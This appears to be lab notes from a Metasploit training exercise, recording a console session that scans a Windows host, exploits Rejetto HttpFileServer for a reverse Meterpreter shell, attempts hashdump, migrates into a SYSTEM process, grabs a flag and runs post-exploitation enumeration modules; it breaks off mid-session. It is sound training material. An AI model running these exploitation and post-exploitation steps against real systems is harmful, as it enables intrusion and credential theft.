- The MSF provides us with various post exploitation modules for both Windows and Linux
- We can utilize these post exploitation modules to enumerate information about the Windows system we currently have access to:
	- Enumerate user privileges
	- Enumerate logged on users
	- VM check
	- Enumerate installed programs
	- Enumerate AVs
	- Enumerate computers connected to domain
	- Enumerate installed patches
	- Enumerate shares

```
root@attackdefense:~# cat ~/Desktop/target 
Target IP Address : 10.5.29.148
root@attackdefense:~# service postgresql status
12/main (port 5432): down
root@attackdefense:~# service postgresql start && msfconsole
Starting PostgreSQL 12 database server: main.
       =[ metasploit v5.0.74-dev                          ]
+ -- --=[ 1972 exploits - 1088 auxiliary - 338 post       ]
+ -- --=[ 562 payloads - 45 encoders - 10 nops            ]
+ -- --=[ 7 evasion                                       ]

msf5 > db_status
[*] Connected to msf. Connection type: postgresql.
msf5 > workspace -a win_post
[*] Added workspace: win_post
[*] Workspace: win_post
msf5 > setg RHOSTS 10.5.29.148
RHOSTS => 10.5.29.148
msf5 > db_nmap -sV -O 10.5.29.148
[*] Nmap: Starting Nmap 7.70 ( https://nmap.org ) at 2023-08-04 21:42 IST
[*] Nmap: Nmap scan report for 10.5.29.148
[*] Nmap: Host is up (0.0016s latency).
[*] Nmap: Not shown: 989 closed ports
[*] Nmap: PORT      STATE SERVICE            VERSION
[*] Nmap: 80/tcp    open  http               HttpFileServer httpd 2.3
[*] Nmap: 135/tcp   open  msrpc              Microsoft Windows RPC
[*] Nmap: 139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
[*] Nmap: 445/tcp   open  microsoft-ds       Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
[*] Nmap: 3389/tcp  open  ssl/ms-wbt-server?
[*] Nmap: 49152/tcp open  msrpc              Microsoft Windows RPC
[*] Nmap: 49153/tcp open  msrpc              Microsoft Windows RPC
[*] Nmap: 49154/tcp open  msrpc              Microsoft Windows RPC
[*] Nmap: 49155/tcp open  msrpc              Microsoft Windows RPC
[*] Nmap: 49165/tcp open  msrpc              Microsoft Windows RPC
[*] Nmap: 49176/tcp open  msrpc              Microsoft Windows RPC
[*] Nmap: No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
[*] Nmap: TCP/IP fingerprint:
[*] Nmap: OS:SCAN(V=7.70%E=4%D=8/4%OT=80%CT=1%CU=33768%PV=Y%DS=3%DC=I%G=Y%TM=64CD23B8
[*] Nmap: OS:%P=x86_64-pc-linux-gnu)SEQ(SP=103%GCD=1%ISR=107%TI=I%CI=I%II=I%SS=S%TS=7
[*] Nmap: OS:)OPS(O1=M546NW8ST11%O2=M546NW8ST11%O3=M546NW8NNT11%O4=M546NW8ST11%O5=M54
[*] Nmap: OS:6NW8ST11%O6=M546ST11)WIN(W1=2000%W2=2000%W3=2000%W4=2000%W5=2000%W6=2000
[*] Nmap: OS:)ECN(R=Y%DF=Y%T=7F%W=2000%O=M546NW8NNS%CC=Y%Q=)T1(R=Y%DF=Y%T=7F%S=O%A=S+
[*] Nmap: OS:%F=AS%RD=0%Q=)T2(R=Y%DF=Y%T=7F%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R=Y%DF=Y%T
[*] Nmap: OS:=7F%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)T4(R=Y%DF=Y%T=7F%W=0%S=A%A=O%F=R%O=%RD=0
[*] Nmap: OS:%Q=)T5(R=Y%DF=Y%T=7F%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=7F%W=0%S
[*] Nmap: OS:=A%A=O%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=7F%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R
[*] Nmap: OS:=Y%DF=N%T=7F%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N
[*] Nmap: OS:%T=7F%CD=Z)
[*] Nmap: Network Distance: 3 hops
[*] Nmap: Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
[*] Nmap: OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
[*] Nmap: Nmap done: 1 IP address (1 host up) scanned in 86.58 seconds
msf5 > search platform:windows type:exploit name:rejetto

Matching Modules
================

   #  Name                                   Disclosure Date  Rank       Check  Description
   -  ----                                   ---------------  ----       -----  -----------
   0  exploit/windows/http/rejetto_hfs_exec  2014-09-11       excellent  Yes    Rejetto HttpFileServer Remote Command Execution


msf5 > use exploit/windows/http/rejetto_hfs_exec
msf5 exploit(windows/http/rejetto_hfs_exec) > options

Module options (exploit/windows/http/rejetto_hfs_exec):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   HTTPDELAY  10               no        Seconds to wait before terminating web server
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS     10.5.29.148      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT      80               yes       The target port (TCP)
   SRVHOST    0.0.0.0          yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0
   SRVPORT    8080             yes       The local port to listen on.
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
   TARGETURI  /                yes       The path of the web application
   URIPATH                     no        The URI to use for this exploit (default is random)
   VHOST                       no        HTTP server virtual host


Exploit target:

   Id  Name
   --  ----
   0   Automatic


msf5 exploit(windows/http/rejetto_hfs_exec) > run

[*] Started reverse TCP handler on 10.10.19.2:4444 
[*] Using URL: http://0.0.0.0:8080/oyI74idB
[*] Local IP: http://10.10.19.2:8080/oyI74idB
[*] Server started.
[*] Sending a malicious request to /
[*] Payload request received: /oyI74idB
[*] Sending stage (180291 bytes) to 10.5.29.148
[*] Meterpreter session 1 opened (10.10.19.2:4444 -> 10.5.29.148:49308) at 2023-08-04 21:44:52 +0530
[!] Tried to delete %TEMP%\BMSqlFQpeRL.vbs, unknown result
[*] Server stopped.

meterpreter > help

Core Commands
=============

    Command                   Description
    -------                   -----------
    ?                         Help menu
    background                Backgrounds the current session
    bg                        Alias for background
    bgkill                    Kills a background meterpreter script
    bglist                    Lists running background scripts
    bgrun                     Executes a meterpreter script as a background thread
    channel                   Displays information or control active channels
    close                     Closes a channel
    disable_unicode_encoding  Disables encoding of unicode strings
    enable_unicode_encoding   Enables encoding of unicode strings
    exit                      Terminate the meterpreter session
    get_timeouts              Get the current session timeout values
    guid                      Get the session GUID
    help                      Help menu
    info                      Displays information about a Post module
    irb                       Open an interactive Ruby shell on the current session
    load                      Load one or more meterpreter extensions
    machine_id                Get the MSF ID of the machine attached to the session
    migrate                   Migrate the server to another process
    pivot                     Manage pivot listeners
    pry                       Open the Pry debugger on the current session
    quit                      Terminate the meterpreter session
    read                      Reads data from a channel
    resource                  Run the commands stored in a file
    run                       Executes a meterpreter script or Post module
    secure                    (Re)Negotiate TLV packet encryption on the session
    sessions                  Quickly switch to another session
    set_timeouts              Set the current session timeout values
    sleep                     Force Meterpreter to go quiet, then re-establish session.
    transport                 Change the current transport mechanism
    use                       Deprecated alias for "load"
    uuid                      Get the UUID for the current session
    write                     Writes data to a channel


Stdapi: File system Commands
============================

    Command       Description
    -------       -----------
    cat           Read the contents of a file to the screen
    cd            Change directory
    checksum      Retrieve the checksum of a file
    cp            Copy source to destination
    dir           List files (alias for ls)
    download      Download a file or directory
    edit          Edit a file
    getlwd        Print local working directory
    getwd         Print working directory
    lcd           Change local working directory
    lls           List local files
    lpwd          Print local working directory
    ls            List files
    mkdir         Make directory
    mv            Move source to destination
    pwd           Print working directory
    rm            Delete the specified file
    rmdir         Remove directory
    search        Search for files
    show_mount    List all mount points/logical drives
    upload        Upload a file or directory


Stdapi: Networking Commands
===========================

    Command       Description
    -------       -----------
    arp           Display the host ARP cache
    getproxy      Display the current proxy configuration
    ifconfig      Display interfaces
    ipconfig      Display interfaces
    netstat       Display the network connections
    portfwd       Forward a local port to a remote service
    resolve       Resolve a set of host names on the target
    route         View and modify the routing table


Stdapi: System Commands
=======================

    Command       Description
    -------       -----------
    clearev       Clear the event log
    drop_token    Relinquishes any active impersonation token.
    execute       Execute a command
    getenv        Get one or more environment variable values
    getpid        Get the current process identifier
    getprivs      Attempt to enable all privileges available to the current process
    getsid        Get the SID of the user that the server is running as
    getuid        Get the user that the server is running as
    kill          Terminate a process
    localtime     Displays the target system's local date and time
    pgrep         Filter processes by name
    pkill         Terminate processes by name
    ps            List running processes
    reboot        Reboots the remote computer
    reg           Modify and interact with the remote registry
    rev2self      Calls RevertToSelf() on the remote machine
    shell         Drop into a system command shell
    shutdown      Shuts down the remote computer
    steal_token   Attempts to steal an impersonation token from the target process
    suspend       Suspends or resumes a list of processes
    sysinfo       Gets information about the remote system, such as OS


Stdapi: User interface Commands
===============================

    Command        Description
    -------        -----------
    enumdesktops   List all accessible desktops and window stations
    getdesktop     Get the current meterpreter desktop
    idletime       Returns the number of seconds the remote user has been idle
    keyboard_send  Send keystrokes
    keyevent       Send key events
    keyscan_dump   Dump the keystroke buffer
    keyscan_start  Start capturing keystrokes
    keyscan_stop   Stop capturing keystrokes
    mouse          Send mouse events
    screenshare    Watch the remote user's desktop in real time
    screenshot     Grab a screenshot of the interactive desktop
    setdesktop     Change the meterpreters current desktop
    uictl          Control some of the user interface components


Stdapi: Webcam Commands
=======================

    Command        Description
    -------        -----------
    record_mic     Record audio from the default microphone for X seconds
    webcam_chat    Start a video chat
    webcam_list    List webcams
    webcam_snap    Take a snapshot from the specified webcam
    webcam_stream  Play a video stream from the specified webcam


Stdapi: Audio Output Commands
=============================

    Command       Description
    -------       -----------
    play          play an audio file on target system, nothing written on disk


Priv: Elevate Commands
======================

    Command       Description
    -------       -----------
    getsystem     Attempt to elevate your privilege to that of local system.


Priv: Password database Commands
================================

    Command       Description
    -------       -----------
    hashdump      Dumps the contents of the SAM database


Priv: Timestomp Commands
========================

    Command       Description
    -------       -----------
    timestomp     Manipulate file MACE attributes

meterpreter > screenshot
Screenshot saved to: /root/nUPzYsvV.jpeg
meterpreter > hashdump
[-] priv_passwd_get_sam_hashes: Operation failed: The parameter is incorrect.
meterpreter > sysinfo
Computer        : WIN-OMCNBKR66MN
OS              : Windows 2012 R2 (6.3 Build 9600).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 1
Meterpreter     : x86/windows
meterpreter > getuid
Server username: WIN-OMCNBKR66MN\Administrator
meterpreter > getprivs

Enabled Process Privileges
==========================

Name
----
SeBackupPrivilege
SeChangeNotifyPrivilege
SeCreateGlobalPrivilege
SeCreatePagefilePrivilege
SeCreateSymbolicLinkPrivilege
SeDebugPrivilege
SeImpersonatePrivilege
SeIncreaseBasePriorityPrivilege
SeIncreaseQuotaPrivilege
SeIncreaseWorkingSetPrivilege
SeLoadDriverPrivilege
SeManageVolumePrivilege
SeProfileSingleProcessPrivilege
SeRemoteShutdownPrivilege
SeRestorePrivilege
SeSecurityPrivilege
SeShutdownPrivilege
SeSystemEnvironmentPrivilege
SeSystemProfilePrivilege
SeSystemtimePrivilege
SeTakeOwnershipPrivilege
SeTimeZonePrivilege
SeUndockPrivilege

meterpreter > ps

Process List
============

 PID   PPID  Name                  Arch  Session  User                           Path
 ---   ----  ----                  ----  -------  ----                           ----
 0     0     [System Process]                                                    
 4     0     System                x64   0                                       
 348   4     smss.exe              x64   0                                       
 444   656   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE   C:\Windows\System32\svchost.exe
 492   484   csrss.exe             x64   0                                       
 556   548   csrss.exe             x64   1                                       
 564   484   wininit.exe           x64   0        NT AUTHORITY\SYSTEM            C:\Windows\System32\wininit.exe
 592   548   winlogon.exe          x64   1        NT AUTHORITY\SYSTEM            C:\Windows\System32\winlogon.exe
 656   564   services.exe          x64   0                                       
 664   564   lsass.exe             x64   0        NT AUTHORITY\SYSTEM            C:\Windows\System32\lsass.exe
 720   656   svchost.exe           x64   0        NT AUTHORITY\SYSTEM            C:\Windows\System32\svchost.exe
 748   656   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE   C:\Windows\System32\svchost.exe
 840   656   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE     C:\Windows\System32\svchost.exe
 852   592   dwm.exe               x64   1        Window Manager\DWM-1           C:\Windows\System32\dwm.exe
 860   656   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE     C:\Windows\System32\svchost.exe
 892   656   svchost.exe           x64   0        NT AUTHORITY\SYSTEM            C:\Windows\System32\svchost.exe
 956   656   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE     C:\Windows\System32\svchost.exe
 1056  656   spoolsv.exe           x64   0        NT AUTHORITY\SYSTEM            C:\Windows\System32\spoolsv.exe
 1076  656   amazon-ssm-agent.exe  x64   0        NT AUTHORITY\SYSTEM            C:\Program Files\Amazon\SSM\amazon-ssm-agent.exe
 1128  656   LiteAgent.exe         x64   0        NT AUTHORITY\SYSTEM            C:\Program Files\Amazon\XenTools\LiteAgent.exe
 1148  656   svchost.exe           x64   0        NT AUTHORITY\SYSTEM            C:\Windows\System32\svchost.exe
 1188  656   svchost.exe           x64   0        NT AUTHORITY\SYSTEM            C:\Windows\System32\svchost.exe
 1264  656   Ec2Config.exe         x64   0        NT AUTHORITY\SYSTEM            C:\Program Files\Amazon\Ec2ConfigService\Ec2Config.exe
 1548  720   WmiPrvSE.exe          x64   0        NT AUTHORITY\NETWORK SERVICE   C:\Windows\System32\wbem\WmiPrvSE.exe
 1716  2980  conhost.exe           x64   1        WIN-OMCNBKR66MN\Administrator  C:\Windows\System32\conhost.exe
 1924  720   TiWorker.exe          x64   0        NT AUTHORITY\SYSTEM            C:\Windows\WinSxS\amd64_microsoft-windows-servicingstack_31bf3856ad364e35_6.3.9600.19750_none_fa39f32f9b2d0928\TiWorker.exe
 1960  656   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE   C:\Windows\System32\svchost.exe
 1988  656   svchost.exe           x64   0        NT AUTHORITY\SYSTEM            C:\Windows\System32\svchost.exe
 2020  656   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE   C:\Windows\System32\svchost.exe
 2032  656   TrustedInstaller.exe  x64   0        NT AUTHORITY\SYSTEM            C:\Windows\servicing\TrustedInstaller.exe
 2216  720   WmiPrvSE.exe          x64   0        NT AUTHORITY\SYSTEM            C:\Windows\System32\wbem\WmiPrvSE.exe
 2364  892   taskhostex.exe        x64   1        WIN-OMCNBKR66MN\Administrator  C:\Windows\System32\taskhostex.exe
 2436  2404  explorer.exe          x64   1        WIN-OMCNBKR66MN\Administrator  C:\Windows\explorer.exe
 2580  3000  hfs.exe               x86   1        WIN-OMCNBKR66MN\Administrator  C:\hfs\hfs.exe
 2684  2864  VPKxGJKPNAf.exe       x86   1        WIN-OMCNBKR66MN\Administrator  C:\Users\ADMINI~1\AppData\Local\Temp\1\rad65055.tmp\VPKxGJKPNAf.exe
 2864  2580  wscript.exe           x86   1        WIN-OMCNBKR66MN\Administrator  C:\Windows\SysWOW64\wscript.exe
 2900  656   msdtc.exe             x64   0        NT AUTHORITY\NETWORK SERVICE   C:\Windows\System32\msdtc.exe
 2960  892   taskhost.exe          x64   0        NT AUTHORITY\SYSTEM            C:\Windows\System32\taskhost.exe
 2972  892   taskhostex.exe        x64   0        NT AUTHORITY\SYSTEM            C:\Windows\System32\taskhostex.exe
 2980  2684  cmd.exe               x86   1        WIN-OMCNBKR66MN\Administrator  C:\Windows\SysWOW64\cmd.exe
 3000  2436  powershell.exe        x86   1        WIN-OMCNBKR66MN\Administrator  C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
 3016  3000  conhost.exe           x64   1        WIN-OMCNBKR66MN\Administrator  C:\Windows\System32\conhost.exe

meterpreter > migrate 564
[*] Migrating from 2684 to 564...
[*] Migration completed successfully.
meterpreter > getprivs

Enabled Process Privileges
==========================

Name
----
SeAssignPrimaryTokenPrivilege
SeAuditPrivilege
SeBackupPrivilege
SeChangeNotifyPrivilege
SeCreateGlobalPrivilege
SeCreatePermanentPrivilege
SeCreateSymbolicLinkPrivilege
SeDebugPrivilege
SeImpersonatePrivilege
SeIncreaseBasePriorityPrivilege
SeIncreaseQuotaPrivilege
SeLoadDriverPrivilege
SeManageVolumePrivilege
SeRestorePrivilege
SeSecurityPrivilege
SeShutdownPrivilege
SeSystemEnvironmentPrivilege
SeTakeOwnershipPrivilege
SeTcbPrivilege
SeUndockPrivilege

meterpreter > show_mount

Mounts / Drives
===============

Name  Type   Size (Total)  Size (Free)  Mapped to
----  ----   ------------  -----------  ---------
C:\   fixed   29.66 GiB      8.55 GiB   


Total mounts/drives: 1

meterpreter > sysinfo
Computer        : WIN-OMCNBKR66MN
OS              : Windows 2012 R2 (6.3 Build 9600).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 1
Meterpreter     : x64/windows
meterpreter > cd /
meterpreter > ls
Listing: C:\
============

Mode              Size          Type  Last modified               Name
----              ----          ----  -------------               ----
40777/rwxrwxrwx   0             dir   2020-08-12 09:43:47 +0530   $Recycle.Bin
100666/rw-rw-rw-  1             fil   2013-08-22 21:16:48 +0530   BOOTNXT
40777/rwxrwxrwx   0             dir   2013-08-22 20:18:41 +0530   Documents and Settings
40777/rwxrwxrwx   0             dir   2013-08-22 21:09:30 +0530   PerfLogs
40555/r-xr-xr-x   4096          dir   2013-08-22 19:06:16 +0530   Program Files
40777/rwxrwxrwx   0             dir   2013-08-22 19:06:16 +0530   Program Files (x86)
40777/rwxrwxrwx   4096          dir   2013-08-22 19:06:16 +0530   ProgramData
40777/rwxrwxrwx   0             dir   2020-09-05 09:16:25 +0530   System Volume Information
40555/r-xr-xr-x   4096          dir   2013-08-22 19:06:16 +0530   Users
40777/rwxrwxrwx   24576         dir   2013-08-22 19:06:16 +0530   Windows
100444/r--r--r--  398356        fil   2013-08-22 21:16:48 +0530   bootmgr
100666/rw-rw-rw-  32            fil   2020-09-14 12:21:58 +0530   flag.txt
40777/rwxrwxrwx   0             dir   2020-09-14 11:40:20 +0530   hfs
0204/-w----r--    567611636816  fif   19956-11-24 23:03:52 +0530  pagefile.sys

meterpreter > cat flag.txt 
f74c8347798f4082daf4b4570dba094ameterpreter > download flag.txt
[*] Downloading: flag.txt -> flag.txt
[*] Downloaded 32.00 B of 32.00 B (100.0%): flag.txt -> flag.txt
[*] download   : flag.txt -> flag.txt
meterpreter > bg
[*] Backgrounding session 1...
msf5 exploit(windows/http/rejetto_hfs_exec) > sessions

Active sessions
===============

  Id  Name  Type                     Information                            Connection
  --  ----  ----                     -----------                            ----------
  1         meterpreter x64/windows  NT AUTHORITY\SYSTEM @ WIN-OMCNBKR66MN  10.10.19.2:4444 -> 10.5.29.148:49308 (10.5.29.148)

msf5 exploit(windows/http/rejetto_hfs_exec) >
```

Upgrade the meterpreter module: manage migrate or archmigrate we can use

```
msf5 exploit(windows/http/rejetto_hfs_exec) > search platform:windows type:post name:upgrade

Matching Modules
================

   #  Name                                    Disclosure Date  Rank    Check  Description
   -  ----                                    ---------------  ----    -----  -----------
   0  post/multi/manage/shell_to_meterpreter                   normal  No     Shell to Meterpreter Upgrade


msf5 exploit(windows/http/rejetto_hfs_exec) > search platform:windows type:post name:migrate

Matching Modules
================

   #  Name                             Disclosure Date  Rank    Check  Description
   -  ----                             ---------------  ----    -----  -----------
   0  post/windows/manage/archmigrate                   normal  No     Architecture Migrate


msf5 exploit(windows/http/rejetto_hfs_exec) > use post/windows/manage/archmigrate
msf5 post(windows/manage/archmigrate) > options

Module options (post/windows/manage/archmigrate):

   Name           Current Setting                   Required  Description
   ----           ---------------                   --------  -----------
   EXE            C:\windows\sysnative\svchost.exe  yes       The executable to start and migrate into
   FALLBACK       true                              yes       If the selected migration executable does not exist fallback to a sysnative file
   IGNORE_SYSTEM  false                             yes       Migrate even if you have SYSTEM privileges
   SESSION                                          yes       The session to run this module on.

msf5 post(windows/manage/archmigrate) > set session 1
session => 1
msf5 post(windows/manage/archmigrate) > run

[-] You are running as SYSTEM! Aborting migration.
[*] Post module execution completed
msf5 post(windows/manage/archmigrate) > set ignore_system true 
ignore_system => true
msf5 post(windows/manage/archmigrate) > run

[+] The meterpreter is the same architecture as the OS!
[*] Post module execution completed
msf5 post(windows/manage/archmigrate) >
msf5 post(windows/manage/archmigrate) > search migrate

Matching Modules
================

   #   Name                                         Disclosure Date  Rank       Check  Description
   -   ----                                         ---------------  ----       -----  -----------
   0   exploit/unix/webapp/awstats_migrate_exec     2006-05-04       excellent  Yes    AWStats migrate Remote Command Execution
   1   exploit/windows/http/hp_nnm_ovas             2008-04-02       good       Yes    HP OpenView NNM 7.53, 7.51 OVAS.EXE Pre-Authentication Stack Buffer Overflow
   2   exploit/windows/local/ms13_053_schlamperei   2013-12-01       average    Yes    Windows NTUserMessageCall Win32k Kernel Pool Overflow (Schlamperei)
   3   post/windows/capture/keylog_recorder                          normal     No     Windows Capture Keystroke Recorder
   4   post/windows/capture/lockout_keylogger                        normal     No     Windows Capture Winlogon Lockout Credential Keylogger
   5   post/windows/gather/enum_services                             normal     No     Windows Gather Service Info Enumeration
   6   post/windows/gather/local_admin_search_enum                   normal     No     Windows Gather Local Admin Search
   7   post/windows/gather/memory_grep                               normal     No     Windows Gather Process Memory Grep
   8   post/windows/manage/add_user_domain                           normal     No     Windows Manage Add User to the Domain and/or to a Domain Group
   9   post/windows/manage/archmigrate                               normal     No     Architecture Migrate
   10  post/windows/manage/migrate                                   normal     No     Windows Manage Process Migration
   11  post/windows/manage/mssql_local_auth_bypass                   normal     No     Windows Manage Local Microsoft SQL Server Authorization Bypass
   12  post/windows/manage/priv_migrate                              normal     No     Windows Manage Privilege Based Process Migration 


msf5 post(windows/manage/archmigrate) > use post/windows/manage/migrate
msf5 post(windows/manage/migrate) > options

Module options (post/windows/manage/migrate):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   KILL       false            no        Kill original process for the session.
   NAME                        no        Name of process to migrate to.
   PID        0                no        PID of process to migrate to.
   PPID       0                no        Process Identifier for PPID spoofing when creating a new process. (0 = no PPID spoofing).
   PPID_NAME                   no        Name of process for PPID spoofing when creating a new process.
   SESSION                     yes       The session to run this module on.
   SPAWN      true             no        Spawn process to migrate to. If set, notepad.exe is used.

msf5 post(windows/manage/migrate) >
```

privileges gathering

```
msf5 post(windows/manage/migrate) > search privs type:post

Matching Modules
================

   #  Name                                 Disclosure Date  Rank    Check  Description
   -  ----                                 ---------------  ----    -----  -----------
   0  post/windows/gather/enum_tokens                       normal  No     Windows Gather Enumerate Domain Admin Tokens (Token Hunter)
   1  post/windows/gather/win_privs                         normal  No     Windows Gather Privileges Enumeration
   2  post/windows/manage/add_user_domain                   normal  No     Windows Manage Add User to the Domain and/or to a Domain Group
   3  post/windows/manage/persistence_exe                   normal  No     Windows Manage Persistent EXE Payload Installer


msf5 post(windows/manage/migrate) > use post/windows/gather/win_privs
msf5 post(windows/gather/win_privs) > options

Module options (post/windows/gather/win_privs):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION                   yes       The session to run this module on.

msf5 post(windows/gather/win_privs) > set session 1
session => 1
msf5 post(windows/gather/win_privs) > run

Current User
============

 Is Admin  Is System  Is In Local Admin Group  UAC Enabled  Foreground ID  UID
 --------  ---------  -----------------------  -----------  -------------  ---
 True      True       True                     False        1              NT AUTHORITY\SYSTEM

Windows Privileges
==================

 Name
 ----
 SeAssignPrimaryTokenPrivilege
 SeAuditPrivilege
 SeBackupPrivilege
 SeChangeNotifyPrivilege
 SeCreateGlobalPrivilege
 SeCreatePermanentPrivilege
 SeCreateSymbolicLinkPrivilege
 SeDebugPrivilege
 SeImpersonatePrivilege
 SeIncreaseBasePriorityPrivilege
 SeIncreaseQuotaPrivilege
 SeLoadDriverPrivilege
 SeManageVolumePrivilege
 SeRestorePrivilege
 SeSecurityPrivilege
 SeShutdownPrivilege
 SeSystemEnvironmentPrivilege
 SeTakeOwnershipPrivilege
 SeTcbPrivilege
 SeUndockPrivilege

[*] Post module execution completed
msf5 post(windows/gather/win_privs) >
```

```
msf5 post(windows/gather/win_privs) > search type:post name:enum platform:windows

Matching Modules
================

   #   Name                                             Disclosure Date  Rank    Check  Description
   -   ----                                             ---------------  ----    -----  -----------
   0   post/multi/gather/enum_vbox                                       normal  No     Multi Gather VirtualBox VM Enumeration
   1   post/multi/gather/skype_enum                                      normal  No     Multi Gather Skype User Data Enumeration
   2   post/multi/gather/wlan_geolocate                                  normal  No     Multiplatform WLAN Enumeration and Geolocation
   3   post/windows/gather/credentials/enum_cred_store                   normal  No     Windows Gather Credential Store Enumeration and Decryption Module
   4   post/windows/gather/credentials/imail                             normal  No     Windows Gather IPSwitch iMail User Data Enumeration
   5   post/windows/gather/enum_applications                             normal  No     Windows Gather Installed Application Enumeration
   6   post/windows/gather/enum_artifacts                                normal  No     Windows Gather File and Registry Artifacts Enumeration
   7   post/windows/gather/enum_av_excluded                              normal  No     Windows Antivirus Exclusions Enumeration
   8   post/windows/gather/enum_chrome                                   normal  No     Windows Gather Google Chrome User Data Enumeration
   9   post/windows/gather/enum_computers                                normal  No     Windows Gather Enumerate Computers
   10  post/windows/gather/enum_db                                       normal  No     Windows Gather Database Instance Enumeration
   11  post/windows/gather/enum_devices                                  normal  No     Windows Gather Hardware Enumeration
   12  post/windows/gather/enum_dirperms                                 normal  No     Windows Gather Directory Permissions Enumeration
   13  post/windows/gather/enum_domain                                   normal  No     Windows Gather Enumerate Domain
   14  post/windows/gather/enum_domain_group_users                       normal  No     Windows Gather Enumerate Domain Group
   15  post/windows/gather/enum_domain_tokens                            normal  No     Windows Gather Enumerate Domain Tokens
   16  post/windows/gather/enum_domain_users                             normal  No     Windows Gather Enumerate Active Domain Users
   17  post/windows/gather/enum_domains                                  normal  No     Windows Gather Domain Enumeration
   18  post/windows/gather/enum_hostfile                                 normal  No     Windows Gather Windows Host File Enumeration
   19  post/windows/gather/enum_ie                                       normal  No     Windows Gather Internet Explorer User Data Enumeration
   20  post/windows/gather/enum_logged_on_users                          normal  No     Windows Gather Logged On User Enumeration (Registry)
   21  post/windows/gather/enum_muicache                                 normal  No     Windows Gather Enum User MUICache
   22  post/windows/gather/enum_powershell_env                           normal  No     Windows Gather Powershell Environment Setting Enumeration
   23  post/windows/gather/enum_putty_saved_sessions                     normal  No     PuTTY Saved Sessions Enumeration Module
   24  post/windows/gather/enum_services                                 normal  No     Windows Gather Service Info Enumeration
   25  post/windows/gather/enum_shares                                   normal  No     Windows Gather SMB Share Enumeration via Registry
   26  post/windows/gather/enum_snmp                                     normal  No     Windows Gather SNMP Settings Enumeration (Registry)
   27  post/windows/gather/enum_tokens                                   normal  No     Windows Gather Enumerate Domain Admin Tokens (Token Hunter)
   28  post/windows/gather/enum_tomcat                                   normal  No     Windows Gather Apache Tomcat Enumeration
   29  post/windows/gather/enum_unattend                                 normal  No     Windows Gather Unattended Answer File Enumeration
   30  post/windows/gather/forensics/recovery_files                      normal  No     Windows Gather Deleted Files Enumeration and Recovering
   31  post/windows/gather/lsa_secrets                                   normal  No     Windows Enumerate LSA Secrets
   32  post/windows/gather/win_privs                                     normal  No     Windows Gather Privileges Enumeration

```

logged on users

```
msf5 post(windows/gather/win_privs) > use post/windows/gather/enum_logged_on_users
msf5 post(windows/gather/enum_logged_on_users) > options

Module options (post/windows/gather/enum_logged_on_users):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   CURRENT  true             yes       Enumerate currently logged on users
   RECENT   true             yes       Enumerate Recently logged on users
   SESSION                   yes       The session to run this module on.

msf5 post(windows/gather/enum_logged_on_users) > set session 1
session => 1
msf5 post(windows/gather/enum_logged_on_users) > run

[*] Running against session 1

Current Logged Users
====================

 SID                                            User
 ---                                            ----
 S-1-5-18                                       NT AUTHORITY\SYSTEM
 S-1-5-21-2563855374-3215282501-1490390052-500  WIN-OMCNBKR66MN\Administrator


[+] Results saved in: /root/.msf4/loot/20230804221208_win_post_10.5.29.148_host.users.activ_025608.txt

Recently Logged Users
=====================

 SID                                            Profile Path
 ---                                            ------------
 S-1-5-18                                       %systemroot%\system32\config\systemprofile
 S-1-5-19                                       C:\Windows\ServiceProfiles\LocalService
 S-1-5-20                                       C:\Windows\ServiceProfiles\NetworkService
 S-1-5-21-2563855374-3215282501-1490390052-500  C:\Users\Administrator


[*] Post module execution completed
msf5 post(windows/gather/enum_logged_on_users) > 
```

is the target a virtual machine

```
msf5 post(windows/gather/enum_logged_on_users) > search checkvm

Matching Modules
================

   #  Name                         Disclosure Date  Rank    Check  Description
   -  ----                         ---------------  ----    -----  -----------
   0  post/linux/gather/checkvm                     normal  No     Linux Gather Virtual Environment Detection
   1  post/solaris/gather/checkvm                   normal  No     Solaris Gather Virtual Environment Detection
   2  post/windows/gather/checkvm                   normal  No     Windows Gather Virtual Environment Detection


msf5 post(windows/gather/enum_logged_on_users) > use post/windows/gather/checkvm
msf5 post(windows/gather/checkvm) > options

Module options (post/windows/gather/checkvm):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION                   yes       The session to run this module on.

msf5 post(windows/gather/checkvm) > set session 1
session => 1
msf5 post(windows/gather/checkvm) > run

[*] Checking if WIN-OMCNBKR66MN is a Virtual Machine .....
[+] This is a Xen Virtual Machine
[*] Post module execution completed
msf5 post(windows/gather/checkvm) > 
```

We can use VM breakout modules to access the target host system and network as well.

Installed applications

```
msf5 post(windows/gather/checkvm) > use post/windows/gather/enum_applications 
msf5 post(windows/gather/enum_applications) > options

Module options (post/windows/gather/enum_applications):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION                   yes       The session to run this module on.

